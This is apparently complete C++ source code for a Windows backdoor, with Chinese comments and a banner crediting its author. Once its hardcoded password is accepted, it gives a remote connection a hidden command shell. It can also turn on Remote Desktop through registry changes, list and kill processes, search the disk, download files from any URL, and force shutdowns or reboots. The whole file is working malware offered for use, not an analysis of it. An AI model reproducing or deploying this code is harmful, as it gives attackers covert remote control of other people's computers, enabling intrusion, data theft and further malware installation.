// door.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <winsock2.h>
#include <tlhelp32.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ws2_32.lib")

struct DirList{
	char table[256];
	DirList *pNext;
};

DirList *first,*newlist,*last;

//加入文件夹链表
void AddList(char *list)
{
	newlist=new DirList;
	strcpy(newlist->table,list);
	newlist->pNext=NULL;
	//假如文件链表为空，那么第一个和最后一个节点都指向新节点
	if(first==NULL)
	{
		first=newlist;
		last=newlist;
	}
	//不为空，则原来最后一个节点指向新节点
	else
	{
		last->pNext=newlist;
		last=newlist;
	}	
}

//查找文件，并把找到的文件夹加入文件夹链表
void FindFile(SOCKET s,char *pRoad,char *pFile)
{
	char FileRoad[256]={0};
	char DirRoad[256]={0};
	char FindedFile[256]={0};
	char FindedDir[256]={0};		
	strcpy(FileRoad,pRoad);
	strcpy(DirRoad,pRoad);
	strcat(DirRoad,"\\*.*");
	WIN32_FIND_DATA findData;
	HANDLE hFindFile;
	hFindFile=FindFirstFile(DirRoad,&findData);
	if(hFindFile!=INVALID_HANDLE_VALUE)
	{
		do
		{
			if(findData.cFileName[0]=='.')
				continue;
			//假如是文件夹，则假如文件夹列表
			if(findData.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)
			{
				strcpy(FindedDir,pRoad);	
				strcat(FindedDir,"\\");
				strcat(FindedDir,findData.cFileName);
				//加入文件夹列表
				AddList(FindedDir);
				memset(FindedDir,0x00,256);
			}
			//继续查找
		}while(FindNextFile(hFindFile,&findData));
	}	
	strcat(FileRoad,"\\");
	strcat(FileRoad,pFile);
	//查找要查找的文件
	hFindFile=FindFirstFile(FileRoad,&findData);
	if(hFindFile!=INVALID_HANDLE_VALUE)
	{
		do
		{ 
			strcpy(FindedFile,pRoad);
			strcat(FindedFile,"\\");
			strcat(FindedFile,findData.cFileName);
			strcat(FindedFile,"\r\n");
			//传输查找到的文件
			send(s,FindedFile,strlen(FindedFile),0);
			memset(FindedFile,0x00,256);
		}while(FindNextFile(hFindFile,&findData));
	}	
}

int SeachFile(SOCKET s,char *Directory,char *SeachFile)
{
	DirList NewList;
	strcpy(NewList.table,Directory);
	NewList.pNext=NULL;
	//初始化第一个和最后一个节点
	last=&NewList;
	first=&NewList; 
	while(true)
	{	
		DirList *Find;
		//假如链表不为空，提取链表中的第一个节点，并把第一个节点指向原来第二个
		if(first!=NULL)
		{
			Find=first;
			first=first->pNext;
			FindFile(s,Find->table,SeachFile);		
		}
		//为空则停止查找
		else
		{
			send(s,"\r\n文件搜索完毕\r\n",strlen("\r\n文件搜索完毕\r\n"),0);
			return 0;		
		}		
	}	
	return 0;	
}

//用于修改字符类型键值
void CreateStringReg(HKEY hRoot,char *szSubKey,char* ValueName,char *Data)
{
	HKEY hKey;
	//打开注册表键，不存在则创建它
	long lRet=RegCreateKeyEx(hRoot,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
    if (lRet!=ERROR_SUCCESS)
	{
		printf("error no RegCreateKeyEx %s\n", szSubKey);
		return ;
	}
	//修改注册表键值，没有则创建它
	lRet=RegSetValueEx(hKey,ValueName,0,REG_SZ,(BYTE*)Data,strlen(Data));
	if (lRet!=ERROR_SUCCESS)
	{
		printf("error no RegSetValueEx %s\n", ValueName);
		return ;
	}
	RegCloseKey(hKey);
}

//用于修改数字类型键值
void CreateDWORDReg(HKEY hRoot,char *szSubKey,char* ValueName,DWORD Data)
{
	HKEY hKey;
	//打开注册表键，不存在则创建它
	long lRet=RegCreateKeyEx(hRoot,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
    if (lRet!=ERROR_SUCCESS)
	{
		printf("error no RegCreateKeyEx %s\n", szSubKey);
		return ;
	}
	DWORD dwSize=sizeof(DWORD);
	//修改注册表键值，没有则创建它
	lRet=RegSetValueEx(hKey,ValueName,0,REG_DWORD,(BYTE*)&Data,dwSize);
	if (lRet!=ERROR_SUCCESS)
	{
		printf("error no RegSetValueEx %s\n", ValueName);
		return ;
	}
	RegCloseKey(hKey);
}

//关机
void ShutDown()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	//代开当前进程信令
	if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))
		return;
	//获取本地文艺表示用于在特定的系统中设置权限
	LookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,&tkp.Privileges[0].Luid);
	tkp.PrivilegeCount=1;
	tkp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
	//提升访问令牌权限
	AdjustTokenPrivileges(hToken,FALSE,&tkp,0,(PTOKEN_PRIVILEGES)NULL,0);
	//关机，要实现重启只需将第一个参数换成EWX_REBOOT|EWX_FORCE
	//注销第一个参数换成EWX_LOGOFF|EWX_FORCE
	ExitWindowsEx(EWX_SHUTDOWN|EWX_FORCE,0);
	
}

//注销
void LogOff()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))
		return;
	LookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,&tkp.Privileges[0].Luid);
	tkp.PrivilegeCount=1;
	tkp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken,FALSE,&tkp,0,(PTOKEN_PRIVILEGES)NULL,0);
    ExitWindowsEx(EWX_LOGOFF|EWX_FORCE,0);
	
}

//重启
void Reboot()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))
		return;
	LookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,&tkp.Privileges[0].Luid);
	tkp.PrivilegeCount=1;
	tkp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken,FALSE,&tkp,0,(PTOKEN_PRIVILEGES)NULL,0);
    ExitWindowsEx(EWX_REBOOT|EWX_FORCE,0);
	
}

//cmdshell线程函数
DWORD WINAPI CmdThread( LPVOID lpParam )
{   
	SOCKET s=(SOCKET)lpParam;
	STARTUPINFO si;
	GetStartupInfo(&si);
    si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow=SW_HIDE;
	//使cmd的输入输出直接和socket关联
	si.hStdInput=si.hStdOutput=si.hStdError=(void*)s;
	char cmdline[256];
	//得到cmd路径
	GetSystemDirectory(cmdline,sizeof(cmdline));
	strcat(cmdline,"\\cmd.exe");
	PROCESS_INFORMATION ProcessInformation;
	int ret;
	//建立cmd进程
	ret=CreateProcess(NULL,cmdline,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
	//等待进程结束
	WaitForSingleObject(ProcessInformation.hProcess,INFINITE);
	CloseHandle(ProcessInformation.hProcess);
	return 0;
}

//开启3389
int Open3389(SOCKET s,DWORD Port)
{
	CreateStringReg(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\netcache","Enabled","0");
    CreateDWORDReg(HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\Windows\\Installer","EnableAdminTSRemote",0x00000001);
    CreateStringReg(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","ShutdownWithoutLogon","0");
    CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server","TSEnabled",0x00000001);
    CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\TermDD","Start",0x00000002);
    CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\TermService","Start",0x00000002);
	CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server","fDenyTSConnections",0x00000001);
    CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\RDPTcp","PortNumber",Port);
	CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp","PortNumber",Port);
    CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp","PortNumber",Port);
    CreateStringReg(HKEY_USERS,".DEFAULT\\Keyboard Layout\\Toggle","Hotkey","2");
    CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server","fDenyTSConnections",0x00000000);
	OSVERSIONINFO osver={sizeof(OSVERSIONINFO)};
	GetVersionEx(&osver);
	//判断是不是windows 2000是则重启
	if(osver.dwMajorVersion==5&&osver.dwMinorVersion==0)
	{
		send(s,"\r\n下面重启计算机\r\n",sizeof("\r\n下面重启计算机\r\n"),0);
		Reboot();
	}
	send(s,"\r\n远程终端开启成功\r\n",sizeof("\r\n远程终端开启成功\r\n"),0);
	return 0;
	
}

//列举进程
int GetProcess(SOCKET s)
{
	char buff[1024]={0};
	PROCESSENTRY32 pe32;
	pe32.dwSize=sizeof(pe32);
	HANDLE hProcessSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if(hProcessSnap==INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot failed");
		return 0;
	}
	//循环列举进程
	BOOL bMore=Process32First(hProcessSnap,&pe32);
	while(bMore)
	{
		wsprintf(buff,"%s---------------%d\r\n",pe32.szExeFile,pe32.th32ProcessID);
		send(s,buff,strlen(buff),0);
		memset(buff,0x00,1024);	
		bMore=Process32Next(hProcessSnap,&pe32);
	}
        CloseHandle(hProcessSnap);
	return 0;
}

//结束进程
int KillProcess(SOCKET s,DWORD Pid)
{
	char sendData[80];
	//打开进程得到进程句柄
	HANDLE hProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,Pid);
	if(hProcess==NULL)
	{ 		
		strcpy(sendData,"\r\n结束进程失败\r\n");
		send(s,sendData,strlen(sendData),0);
		return 0;
	}
	//结束进程
	if (TerminateProcess(hProcess,0))
	{
		strcpy(sendData,"\r\n结束进程成功\r\n");
		send(s,sendData,strlen(sendData),0);
		return 0;
	}
	else
	{
		strcpy(sendData,"\r\n结束进程失败\r\n");
		send(s,sendData,strlen(sendData),0);
		return 0;
	}	
}

//判断文件是否存在
BOOL FileExists(LPCTSTR lpszFileName)
{
	//得到文件属性
	DWORD dwAttributes=GetFileAttributes(lpszFileName);
	//函数调用成功则文件存在
	if(dwAttributes==0xffffffff)
	{
		return false;
	}
	//否则文件不存在
	else
	{
		return true;
	}
}

//http下载文件
void download(SOCKET s,char *Url,char *FilePath)
{
	if(FileExists(FilePath))
	{
		//删除已有文件
		if(!DeleteFile(FilePath))
		{
			send(s,"\r\n文件已存在，并且无法删除\r\n",strlen("\r\n文件已存在，并且无法删除\r\n"),0);	
			return;
		}
	}
	//下载文件
	URLDownloadToFile(0,Url,FilePath,0,0);
	//判断文件存不存在，以确定下载成有与否
	if(FileExists(FilePath))
	{
		send(s,"\r\n文件下载成功\r\n",strlen("\r\n文件下载成功\r\n"),0);	
	}
	else
	{
		send(s,"\r\n文件下载失败\r\n",strlen("\r\n文件下载失败\r\n"),0);
	}	
}

DWORD WINAPI DoorThread( LPVOID lpParam )
{
	
	SOCKET s=(SOCKET)lpParam;
	send(s,"door>",sizeof("door>"),0);
	char buff[1024]={0};
	char DoorData[1024]={0};
	int ret;
	
	while(true)
	{
		while(true)
		{
			//每次接收一个字符
			if(ret=recv(s,buff,1,0)==SOCKET_ERROR)
			{
				closesocket(s);
				return 0;
			}
			//假如是回车则跳出循环
			if(buff[0]==0xa)
			{	
				break;
			}
			//假如不是回车就把字符累加给DoorData
			if( buff[0]!=0xa&& buff[0]!=0xd)
				strcat(DoorData,buff);	
			
		}
		//启动cmdshell
		if(strncmp(DoorData,"cmdshell",8)==0)
		{
			DWORD dwThreadId;
			HANDLE hThread;
			hThread=CreateThread(NULL,NULL,CmdThread,(LPVOID)s,0,&dwThreadId);
			WaitForSingleObject(hThread,INFINITE);	
		}
		//开启远程终端
		if(strncmp(DoorData,"open",4)==0)
		{
			char *port=DoorData;
			port=port+5;
			DWORD T_Port=atoi(port);
			Open3389(s,T_Port);	
		}
		//读取进程列表
		if(strncmp(DoorData,"plist",5)==0)
		{
			GetProcess(s);
		}
		//结束进程
		if(strncmp(DoorData,"pkill",5)==0)
		{
			char *Pid=DoorData;
			Pid=Pid+6;
			DWORD P_id=atoi(Pid);
			KillProcess(s,P_id);	
		}
		//查找文件
		if(strncmp(DoorData,"seach",5)==0)
		{
			if(strlen(DoorData)>9)
			{
				char *AllData=DoorData;
				AllData=AllData+6;
				char PartData[256];
				strcpy(PartData,AllData);
				char *FileName=strstr(PartData," ");
				if(FileName!=NULL)
				{
					FileName=FileName+1;
					char *SeachFiles=FileName;
					FileName=FileName-1;
					*FileName=NULL;
					SeachFile(s,PartData,SeachFiles);
				}
			}
			
		}
		//http下载文件
		if(strncmp(DoorData,"down",4)==0)
		{
			if(strlen(DoorData)>20)
			{
				char *DownData=DoorData;
				DownData=DownData+5;
				char Url[256];
				strcpy(Url,DownData);
				char *Path=strstr(Url," ");
				if (Path!=NULL)
				{
					Path=Path+1;
					char *FilePath=Path;
					Path=Path-1;
					*Path=NULL;
					download(s,Url,FilePath);
				}
			}
		}
		//重启
		if(strncmp(DoorData,"reboot",6)==0)
		{
			Reboot();	
		}
		//关机
		if(strncmp(DoorData,"shutdown",8)==0)
		{
			ShutDown();
		}
		//注销
		if(strncmp(DoorData,"logoff",6)==0)
		{
			LogOff();
		}
		//帮助
		if(strncmp(DoorData,"help",4)==0)
		{
			char HelpData[1024]="help  --帮助\r\nopen port  --开启远程终端\r\ncmdshell  --进入cmdshell\r\nseach path filename  --搜索文件\r\ndown httpurl filepath  --http下载文件\r\nreboot  --重启计算机\r\nshutdown  --关闭计算机\r\nlogoff  --注销用户\r\nexit  --退出cmdshell\r\nquit  --退出后门程序\r\n";
            send(s,HelpData,strlen(HelpData),0);
		}
		//退出后门
		if(strncmp(DoorData,"quit",4)==0)
		{
			closesocket(s);
			return 0;
		}
		
		if(strlen(DoorData)||buff[0]==0xa) 
			send(s,"door>",sizeof("door>"),0);
		memset(DoorData,0,1024);
	}
	return 0;		
}

int main(int argc, char* argv[])
{
	char wMessage[512] = "========================  BackDoor by 认真的雪  ========================\r\n";
	//建立socket数组
	SOCKET sClient[5];
    //初始化socket，并且监听端口
	WSADATA wsaData;
	WORD sockVersion = MAKEWORD(2, 2);
	if(WSAStartup(sockVersion, &wsaData) != 0)
        return 0;
	SOCKET sListen = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if(sListen == INVALID_SOCKET)
	{
		printf("socket error \n");
		return 0;
	}
	//设置socket属性
	sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(4500);
	sin.sin_addr.S_un.S_addr = INADDR_ANY;
	
	if(bind(sListen, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		printf("bind error \n");
		return 0;
	}
	//监听端口，参数5表示最多只能接受五个连接
	if(listen(sListen, 5) == SOCKET_ERROR)
	{
		printf("listen error \n");
		return 0;
	}
	DWORD dwThreadId;
	char buff[1024]={0};
	char PassWord[1024]={0};
	int ret;
	//循环，用于接收连接，这里的循环次数和前面listen函数中的第二个参数要一致，
	//因为只能接收5个连接，循环一次接收一个连接，所以只能循环5次
	for(int i=0;i<5;i++)
	{
		//接收连接
        sClient[i]  =accept(sListen,NULL,NULL);
		send(sClient[i],"PassWord:\r\n",strlen("PassWord:\r\n"),0);
		while(true)
		{
			//每次接收一个字符
			if(ret=recv(sClient[i],buff,1,0)==SOCKET_ERROR)
			{
				closesocket(sClient[i]);
				return 0;
			}
			//收到回车符则跳出循环
			if(buff[0]==0xa)
			{	
				break;
			}
			//过滤回车符
			if( buff[0]!=0xa&& buff[0]!=0xd)
				strcat(PassWord,buff);	
		}
		//假如密码正确则创建后门线程
		if(strcmp(PassWord,"nohack")==0)
		{
			//创建后门线程
			CreateThread(NULL,NULL,DoorThread,(LPVOID)sClient[i],0,&dwThreadId);
			//发送欢迎消息
			send(sClient[i],wMessage,strlen(wMessage),0);
		}
		//密码错误则断开连接
		else
		{
			send(sClient[i],"\r\n密码错误\r\n",strlen("\r\n密码错误\r\n"),0);
			closesocket(sClient[i]);
		}
	}
	return 0;
}
